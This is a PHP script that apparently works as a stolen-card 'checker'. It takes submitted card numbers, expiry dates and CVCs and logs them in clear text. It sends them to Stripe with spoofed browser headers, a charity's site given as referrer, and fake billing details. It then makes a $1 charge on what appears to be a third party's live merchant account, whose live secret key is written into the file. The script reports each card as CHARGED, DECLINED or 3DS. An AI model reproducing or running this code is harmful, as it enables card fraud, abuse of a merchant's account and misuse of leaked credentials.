<?php
// Set content type to JSON
header('Content-Type: application/json');

// Get card details from POST request
 $cardNumber = $_POST['card']['number'] ?? '';
 $expMonth = $_POST['card']['exp_month'] ?? '';
 $expYear = $_POST['card']['exp_year'] ?? '';
 $cvc = $_POST['card']['cvc'] ?? '';

// Debug: Log received data (remove in production)
error_log("Card Number: " . $cardNumber);
error_log("Exp Month: " . $expMonth);
error_log("Exp Year: " . $expYear);
error_log("CVC: " . $cvc);

// Validate card details
if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Missing card details']);
    exit;
}

// Format year to 4 digits if needed
if (strlen($expYear) == 2) {
    $expYear = '20' . $expYear;
}

// Create payment method
 $headers = [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
];

 $data = http_build_query([
    'billing_details[address][city]' => 'Oakford',
    'billing_details[address][country]' => 'US',
    'billing_details[address][line1]' => 'Siles Avenue',
    'billing_details[address][line2]' => '',
    'billing_details[address][postal_code]' => '19053',
    'billing_details[address][state]' => 'PA',
    'billing_details[name]' => 'Geroge Washintonne',
    'billing_details[email]' => 'grogeh@gmail.com',
    'type' => 'card',
    'card[number]' => $cardNumber,
    'card[cvc]' => $cvc,
    'card[exp_year]' => $expYear,
    'card[exp_month]' => $expMonth,
    'allow_redisplay' => 'unspecified',
    'payment_user_agent' => 'stripe.js/5445b56991; stripe-js-v3/5445b56991; payment-element; deferred-intent',
    'referrer' => 'https://www.onamissionkc.org',
    'time_on_page' => '145592',
    'client_attribution_metadata[client_session_id]' => '22e7d0ec-db3e-4724-98d2-a1985fc4472a',
    'client_attribution_metadata[merchant_integration_source]' => 'elements',
    'client_attribution_metadata[merchant_integration_subtype]' => 'payment-element',
    'client_attribution_metadata[merchant_integration_version]' => '2021',
    'client_attribution_metadata[payment_intent_creation_flow]' => 'deferred',
    'client_attribution_metadata[payment_method_selection_flow]' => 'merchant_specified',
    'client_attribution_metadata[elements_session_config_id]' => '7904f40e-9588-48b2-bc6b-fb88e0ef71d5',
    'guid' => '18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd',
    'muid' => '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
    'sid' => '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
    'key' => 'pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e',
    '_stripe_account' => 'acct_1LwocDFHMGxIu0Ep'
]);

 $ch = curl_init('https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 $response = curl_exec($ch);
 $apx = json_decode($response, true);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode != 200 || !isset($apx['id'])) {
    $errorMsg = $apx['error']['message'] ?? 'Unknown error';
    echo json_encode(['status' => 'DECLINED', 'message' => $errorMsg]);
    exit;
}

 $paymentMethodId = $apx['id'];

// Create payment intent with 1$ charge
 $intentData = http_build_query([
    'amount' => '100', // 100 cents = $1
    'currency' => 'usd',
    'payment_method' => $paymentMethodId,
    'confirm' => 'true',
    'error_on_requires_action' => 'true',
    'description' => 'Card Verification Test'
]);

 $ch = curl_init('https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_USERPWD, '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:');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Stripe-Version: 2022-11-15',
    'Content-Type: application/x-www-form-urlencoded'
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $intentData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 $intentResponse = curl_exec($ch);
 $intent = json_decode($intentResponse, true);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Process payment intent response
if ($httpCode != 200 || isset($intent['error'])) {
    $errorMsg = $intent['error']['message'] ?? 'Card declined';
    echo json_encode([
        'status' => 'DECLINED',
        'message' => $errorMsg,
        'response' => 'DECLINED'
    ]);
    exit;
}

if ($intent['status'] === 'succeeded') {
    echo json_encode([
        'status' => 'CHARGED',
        'message' => 'Payment of $1.00 successful',
        'response' => 'CHARGED'
    ]);
} elseif ($intent['status'] === 'requires_action') {
    echo json_encode([
        'status' => '3DS',
        'message' => '3D Secure authentication required',
        'response' => '3DS'
    ]);
} else {
    echo json_encode([
        'status' => 'DECLINED',
        'message' => 'Payment failed',
        'response' => 'DECLINED'
    ]);
}
?>
